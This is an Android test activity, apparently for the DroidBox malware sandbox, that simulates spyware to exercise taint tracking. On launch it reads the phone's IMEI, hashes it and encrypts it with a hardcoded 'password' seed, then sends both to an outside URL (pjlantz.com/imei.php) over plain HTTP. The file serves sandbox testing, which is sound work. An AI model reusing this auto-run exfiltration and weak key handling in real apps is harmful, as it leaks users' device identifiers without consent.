package droidbox.tests;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import android.app.Activity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;


public class DroidBoxTests extends Activity {
	
	private String imei, hashedImei;
	private String encryptedImei;
	
    /** 
     * Called when the activity is first created. 
     */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);   
        setContentView(R.layout.main);
        // Setup test variables
        this.setupTest();
        // Run tests
        this.testCryptHash();
        this.testCryptAES();
        this.testNetworkHTTP();
    }
    
    public void setupTest() {
    	// IMEI
        TelephonyManager manager = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
        imei = manager.getDeviceId();
    }
    
    public void testCryptAES() {
    	Log.v("Test", "[*] testCryptAES()");
    	SimpleCrypto s = new SimpleCrypto();
    	String crypto;
		try {
			crypto = s.encrypt("password", imei);
			encryptedImei = s.toHex(crypto.getBytes());
			s.decrypt("password", crypto);
		} catch (Exception e) {
			e.printStackTrace();
		}
    }
    
    /**
     * Usage of hashing in the crypto API
     */
    public void testCryptHash() {
    	Log.v("Test", "[*] testCryptHash()");
    	String testStr = "Hash me";
    	byte messageDigest[];
    	MessageDigest digest = null;
        try {
            // MD5
            digest = java.security.MessageDigest.getInstance("MD5");
            digest.update(testStr.getBytes());
            messageDigest = digest.digest();
            digest.digest(testStr.getBytes());
            
            // SHA1
            digest = java.security.MessageDigest.getInstance("SHA1");
            digest.update(testStr.getBytes());
            messageDigest = digest.digest();
            
            // Hash tainted data
            digest = null;
            digest = java.security.MessageDigest.getInstance("SHA1");
            digest.update(imei.getBytes());
            messageDigest = digest.digest();
            
            // Create Hex String
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < messageDigest.length; i++) {
                String h = Integer.toHexString(0xFF & messageDigest[i]);
                while (h.length() < 2)
                    h = "0" + h;
                hexString.append(h);
            }
            hashedImei = hexString.toString();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }
    
    /**
     * Usage of HTTP connections
     */
    public void testNetworkHTTP() {
    	Log.v("Test", "[*] testNetworkHTTP()");
    	// HttpURLConnection read & write
        URL url =  null;
        HttpURLConnection urlConnection = null;
    	try {
            url = new URL("http://code.google.com/p/droidbox/");
            urlConnection = (HttpURLConnection) url.openConnection();
            BufferedReader rd = new BufferedReader(
                                new InputStreamReader(urlConnection.getInputStream()));
            @SuppressWarnings("unused")
            String line = "";
            while ((line = rd.readLine()) != null);
            
            // HttpURLConnection sending hashed tainted data
            url = new URL("http://pjlantz.com/imei.php?imei=" + hashedImei);
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null);
  
            // HttpURLConnection sending encrypted tainted data
            url = new URL("http://pjlantz.com/imei.php?imei=" + encryptedImei);
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null);
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
    	    urlConnection.disconnect();
    	}
    }
    
	    private class SimpleCrypto {
	
	        public String encrypt(String seed, String cleartext) throws Exception {
                byte[] rawKey = getRawKey(seed.getBytes());
                byte[] result = encrypt(rawKey, cleartext.getBytes());
                return toHex(result);
	        }
	        
	        public String decrypt(String seed, String encrypted) throws Exception {
                byte[] rawKey = getRawKey(seed.getBytes());
                byte[] enc = toByte(encrypted);
                byte[] result = decrypt(rawKey, enc);
                return new String(result);
	        }
	
	        private byte[] getRawKey(byte[] seed) throws Exception {
                KeyGenerator kgen = KeyGenerator.getInstance("AES");
                SecureRandom sr = SecureRandom.getInstance("SHA1PRNG");
                sr.setSeed(seed);
	            kgen.init(128, sr); // 192 and 256 bits may not be available
	            SecretKey skey = kgen.generateKey();
	            byte[] raw = skey.getEncoded();
	            return raw;
	        }
	
	        
	        private byte[] encrypt(byte[] raw, byte[] clear) throws Exception {
	            SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
                Cipher cipher = Cipher.getInstance("AES");
	            cipher.init(Cipher.ENCRYPT_MODE, skeySpec);
	            byte[] encrypted = cipher.doFinal(clear);
                return encrypted;
	        }
	
	        private byte[] decrypt(byte[] raw, byte[] encrypted) throws Exception {
	            SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
                Cipher cipher = Cipher.getInstance("AES");
	            cipher.init(Cipher.DECRYPT_MODE, skeySpec);
	            byte[] decrypted = cipher.doFinal(encrypted);
                return decrypted;
	        }
	        
	        public byte[] toByte(String hexString) {
                int len = hexString.length()/2;
                byte[] result = new byte[len];
                for (int i = 0; i < len; i++)
                    result[i] = Integer.valueOf(hexString.substring(2*i, 2*i+2), 16).byteValue();
                return result;
	        }
	
	        public String toHex(byte[] buf) {
                if (buf == null)
                    return "";
                StringBuffer result = new StringBuffer(2*buf.length);
                for (int i = 0; i < buf.length; i++) {
                    appendHex(result, buf[i]);
                }
                return result.toString();
	        }
	        private final static String HEX = "0123456789ABCDEF";
	        private void appendHex(StringBuffer sb, byte b) {
	            sb.append(HEX.charAt((b>>4)&0x0f)).append(HEX.charAt(b&0x0f));
	        }
	        
	}
}